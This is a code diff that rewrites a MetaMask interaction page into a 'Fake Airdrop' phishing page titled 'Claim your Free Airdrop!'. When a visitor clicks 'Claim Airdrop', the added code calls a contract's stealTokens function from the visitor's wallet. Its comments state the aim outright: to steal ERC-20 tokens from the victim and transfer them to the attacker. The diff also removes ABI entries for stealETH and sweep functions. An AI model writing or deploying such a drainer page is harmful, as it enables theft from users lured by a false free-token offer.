@@ -3,29 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MetaMask and Contract Interaction</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+    <title>Fake Airdrop</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
 </head>
 <body>
-    <h1>MetaMask Contract Interaction Example</h1>
+
+    <h1>Claim your Free Airdrop!</h1>
     <button id="connectButton">Connect MetaMask</button>
-    <div id="status"></div>
-    
+    <button id="airdropButton" style="display:none;">Claim Airdrop</button>
+
     <script>
         let web3;
         let contract;
         let userAddress;
-
-        // Contract address and ABI
-        const contractAddress = "0x40D895158787709180fC962f4FE6fd979cAE9F1A"; // Deployed contract address
+        
+        // Contract ABI and address
+        const contractAddress = "0x65a59e7c1879120b0623723ea643fb85f894b128"; // Contract address
         const contractABI = [
-            {
-                "inputs": [],
-                "name": "stealETH",
-                "outputs": [],
-                "stateMutability": "payable",
-                "type": "function"
-            },
             {
                 "inputs": [
                     {
@@ -37,19 +31,6 @@
                 "name": "stealTokens",
                 "outputs": [],
                 "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "_tokenAddress",
-                        "type": "address"
-                    }
-                ],
-                "name": "sweep",
-                "outputs": [],
-                "stateMutability": "payable",
                 "type": "function"
             },
             {
@@ -76,39 +57,42 @@
             }
         ];
 
-        // Connect MetaMask
+        // Connect to MetaMask and get user address
         async function connectMetaMask() {
             if (window.ethereum) {
                 web3 = new Web3(window.ethereum);
                 try {
-                    await window.ethereum.request({ method: "eth_requestAccounts" });
-                    userAddress = (await web3.eth.getAccounts())[0];
-                    contract = new web3.eth.Contract(contractABI, contractAddress);
-                    document.getElementById("status").innerHTML = "Connected to MetaMask with address: " + userAddress;
-                    console.log("Connected to MetaMask with address:", userAddress);
+                    // Request user account
+                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                    userAddress = accounts[0];
+                    document.getElementById('connectButton').style.display = 'none';
+                    document.getElementById('airdropButton').style.display = 'block';
                 } catch (error) {
-                    document.getElementById("status").innerHTML = "Error connecting to MetaMask. Please try again.";
-                    console.error("User denied account access", error);
+                    console.error("User denied MetaMask connection", error);
                 }
             } else {
-                document.getElementById("status").innerHTML = "Please install MetaMask to interact with this app.";
-                alert("Please install MetaMask to interact with this app.");
+                alert("Please install MetaMask!");
             }
         }
 
-        // Example function to interact with contract
-        async function stealTokens(tokenAddress) {
+        // Claim the airdrop (steal tokens)
+        async function claimAirdrop() {
+            const tokenAddress = "0xTokenAddressHere"; // Replace with ERC-20 token address to steal from the victim
+            contract = new web3.eth.Contract(contractABI, contractAddress);
+
             try {
+                // Call the stealTokens function on the contract
                 await contract.methods.stealTokens(tokenAddress).send({ from: userAddress });
-                console.log("Tokens stolen successfully!");
-            } catch (error) {
-                console.error("Error stealing tokens:", error);
+                alert("Airdrop claimed! (Tokens transferred to attacker)");
+            } catch (err) {
+                console.error("Error in claiming airdrop", err);
             }
         }
 
-        // Add event listener to connect button
-        document.getElementById("connectButton").addEventListener("click", connectMetaMask);
+        // Attach event listeners to buttons
+        document.getElementById('connectButton').addEventListener('click', connectMetaMask);
+        document.getElementById('airdropButton').addEventListener('click', claimAirdrop);
     </script>
+
 </body>
 </html>
-
